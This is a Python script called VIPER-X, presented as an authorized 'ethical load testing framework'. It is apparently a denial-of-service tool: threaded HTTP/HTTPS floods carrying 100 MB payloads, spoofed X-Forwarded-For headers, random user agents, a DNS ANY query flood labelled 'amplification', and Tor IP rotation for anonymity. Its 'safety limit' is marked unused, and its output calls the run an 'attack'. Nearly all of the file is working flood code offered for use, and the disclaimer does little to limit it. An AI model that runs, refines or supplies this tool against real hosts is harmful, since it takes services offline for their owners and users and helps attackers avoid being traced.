#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# VIPER-X: Next-Gen Ethical Load Testing Framework
# Author: Security Research Team (Authorized Use Only)
# License: Restricted - Requires Explicit Permission

import os
import sys
import time
import random
import socket
import ssl
import threading
import hashlib
import base64
import json
from concurrent.futures import ThreadPoolExecutor
from stem import Signal
from stem.control import Controller
from collections import defaultdict
from colorama import Fore, Style, init
import pyfiglet
import requests
import dns.resolver

# --- CONFIGURATION ---
MAX_THREADS = min(os.cpu_count() * 8, 200)  # Max threads based on CPU cores
MIN_DELAY = 0.001  # Minimum delay between requests (seconds)
SAFETY_LIMIT = 100000000000000000000000000000000000000  # Safety limit (unused)
PAYLOAD_SIZE_MB = 100# Size of payload per request (MB)
TOR_PORTS = [9050, 9150]  # Tor proxy ports

# Supported protocols and default ports
SUPPORTED_PROTOCOLS = {
    "HTTP": 80,
    "HTTPS": 443,
    "DNS": 53,
    "TCP": None
}

class AttackSimulator:
    """
    Manages global simulation state, user agents, Tor rotation, and statistics.
    """
    def __init__(self):
        self.user_agents = self._load_user_agents()
        self.tor_controller = None
        self.safety_triggered = False
        self.stats = {
            'requests': 0,
            'success_rate': 0,
            'errors': defaultdict(int),
            'start_time': time.time(),
            'total_mb_sent': 0  # Track total MB sent
        }
        self.payload_data = self._generate_payload(PAYLOAD_SIZE_MB) if PAYLOAD_SIZE_MB > 0 else b''

    def _load_user_agents(self):
        """Loads user agents from an online source (fallback to defaults)."""
        print(f"{Fore.YELLOW}[*] Loading user agents...{Style.RESET_ALL}")
        try:
            response = requests.get("https://gist.github.com/pzb/b4b6f57144aea7827ae4", timeout=5)
            response.raise_for_status()
            user_agents = [ua['useragent'] for ua in response.json()]
            print(f"{Fore.GREEN}[+] Loaded {len(user_agents)} user agents.{Style.RESET_ALL}")
            return user_agents
        except Exception as e:
            print(f"{Fore.RED}[!] Failed to load user agents: {e}. Using defaults.{Style.RESET_ALL}")
            return [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
                "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Mobile Safari/537.36"
            ]

    def _generate_payload(self, size_mb):
        """Generates a random payload of specified size (MB)."""
        size_bytes = size_mb * 1024 * 1024
        print(f"{Fore.YELLOW}[*] Generating {size_mb} MB payload...{Style.RESET_ALL}")
        payload = b'0123456789ABCDEF' * (size_bytes // 16)
        payload += b'0123456789ABCDEF'[:size_bytes % 16]
        print(f"{Fore.GREEN}[+] Payload ready.{Style.RESET_ALL}")
        return payload

    def _rotate_tor(self):
        """Rotates Tor IP for anonymity."""
        print(f"{Fore.CYAN}[*] Rotating Tor IP...{Style.RESET_ALL}")
        try:
            with Controller.from_port(port=random.choice(TOR_PORTS)) as ctrl:
                ctrl.authenticate()
                ctrl.signal(Signal.NEWNYM)
                time.sleep(5)
                new_ip = requests.get("https://api.ipify.org", proxies={'http': 'socks5h://127.0.0.1:9050'}).text
                print(f"{Fore.GREEN}[+] New Tor IP: {new_ip}{Style.RESET_ALL}")
                return True
        except Exception as e:
            print(f"{Fore.RED}[!] Tor rotation failed: {e}{Style.RESET_ALL}")
            return False

class TestEngine:
    """
    Handles flood attacks (HTTP/HTTPS/DNS).
    """
    def __init__(self, simulator):
        self.simulator = simulator
        self.ssl_ctx = self._setup_ssl()
        self.dns_resolver = dns.resolver.Resolver()
        self.lock = threading.Lock()

    def _setup_ssl(self):
        """Configures SSL context for HTTPS."""
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def http_flood(self, target, port, use_ssl=False):
        """Sends HTTP/HTTPS requests with payload."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(8)
        
        try:
            sock.connect((target, port))
            if use_ssl:
                sock = self.ssl_ctx.wrap_socket(sock, server_hostname=target)

            path = f"/test-{hashlib.sha256(os.urandom(16)).hexdigest()[:8]}"
            headers = [
                f"User-Agent: {random.choice(self.simulator.user_agents)}",
                "X-Forwarded-For: " + ".".join(map(str, (random.randint(0, 255) for _ in range(4)))),
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive"
            ]
            
            method = "GET"
            body = b''
            if self.simulator.payload_data:
                method = "POST"
                body = self.simulator.payload_data
                headers.append(f"Content-Length: {len(body)}")
                headers.append("Content-Type: application/octet-stream")
                # Update total MB sent
                with self.lock:
                    self.simulator.stats['total_mb_sent'] += PAYLOAD_SIZE_MB

            request = f"{method} {path} HTTP/1.1\r\nHost: {target}\r\n" + "\r\n".join(headers) + "\r\n\r\n"
            
            sock.send(request.encode() + body)
            time.sleep(max(MIN_DELAY, random.expovariate(1/MIN_DELAY)))
            return True
        except Exception as e:
            with self.lock:
                self.simulator.stats['errors'][str(e)[:50]] += 1
            return False
        finally:
            sock.close()

    def dns_amplification(self, target, dns_server="8.8.8.8"):
        """Performs DNS query flood."""
        try:
            self.dns_resolver.nameservers = [dns_server]
            query = self.dns_resolver.resolve(target, 'ANY')
            return True
        except Exception as e:
            with self.lock:
                self.simulator.stats['errors'][f"DNS-{str(e)[:30]}"] += 1
            return False

class SafetyMonitor(threading.Thread):
    """Monitors error rate and stops test if unsafe."""
    def __init__(self, simulator):
        super().__init__()
        self.simulator = simulator
        self.running = True

    def run(self):
        while self.running:
            time.sleep(5)
            error_rate = sum(self.simulator.stats['errors'].values()) / max(1, self.simulator.stats['requests'])
            if error_rate > 0.5:
                print(f"{Fore.RED}[!] SAFETY TRIGGERED: High error rate ({error_rate*100:.1f}%).{Style.RESET_ALL}")
                self.simulator.safety_triggered = True
                break

class MainController:
    """Main control class."""
    def __init__(self):
        init(autoreset=True)
        self.simulator = AttackSimulator()
        self.engine = TestEngine(self.simulator)
        self.monitor = SafetyMonitor(self.simulator)

    def run(self):
        # Hacker-style banner
        banner = pyfiglet.figlet_format("VIPER-X", font="slant")
        print(f"{Fore.RED}{banner}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}FOR AUTHORIZED PENETRATION TESTING ONLY{Style.RESET_ALL}\n")

        if len(sys.argv) < 2:
            print(f"Usage: {sys.argv[0]} <target> <protocol> [port] [duration=30]")
            print(f"Example: {sys.argv[0]} example.com HTTP 80 60")
            sys.exit(1)

        target = sys.argv[1]
        protocol = sys.argv[2].upper() if len(sys.argv) > 2 else "HTTP"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else SUPPORTED_PROTOCOLS.get(protocol, 80)
        duration = int(sys.argv[4]) if len(sys.argv) > 4 else 30

        self.monitor.start()

        print(f"{Fore.CYAN}[+] Target: {target}:{port} ({protocol}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Duration: {duration}s | Threads: {MAX_THREADS}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Payload: {PAYLOAD_SIZE_MB} MB per request{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Attack started at {time.ctime()}{Style.RESET_ALL}\n")

        try:
            with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
                start_time = time.time()
                while time.time() - start_time < duration and not self.simulator.safety_triggered:
                    if protocol == "DNS":
                        executor.submit(self.engine.dns_amplification, target)
                    elif protocol in ["HTTP", "HTTPS"]:
                        executor.submit(self.engine.http_flood, target, port, protocol == "HTTPS")
                    else:
                        print(f"{Fore.RED}[!] Protocol {protocol} not supported.{Style.RESET_ALL}")
                        break

                    self.simulator.stats['requests'] += 1
                    # Real-time stats
                    if self.simulator.stats['requests'] % 100 == 0:
                        mb_sent = self.simulator.stats['total_mb_sent']
                        print(f"{Fore.GREEN}[+] Requests: {self.simulator.stats['requests']} | MB Sent: {mb_sent:.2f}{Style.RESET_ALL}")
                    time.sleep(0.001)
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Stopped by user.{Style.RESET_ALL}")
        finally:
            self.monitor.running = False
            self.monitor.join()

            # Final report
            elapsed = time.time() - self.simulator.stats['start_time']
            print(f"\n{Fore.GREEN}=== TEST RESULTS ===")
            print(f"Duration: {elapsed:.2f}s")
            print(f"Total Requests: {self.simulator.stats['requests']}")
            print(f"Total MB Sent: {self.simulator.stats['total_mb_sent']:.2f} MB")
            success_rate = (1 - (sum(self.simulator.stats['errors'].values()) / max(1, self.simulator.stats['requests']))) * 100
            print(f"Success Rate: {success_rate:.1f}%")
            print(f"Errors: {dict(self.simulator.stats['errors'])}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}===================={Style.RESET_ALL}")

if __name__ == "__main__":
    controller = MainController()
    controller.run()
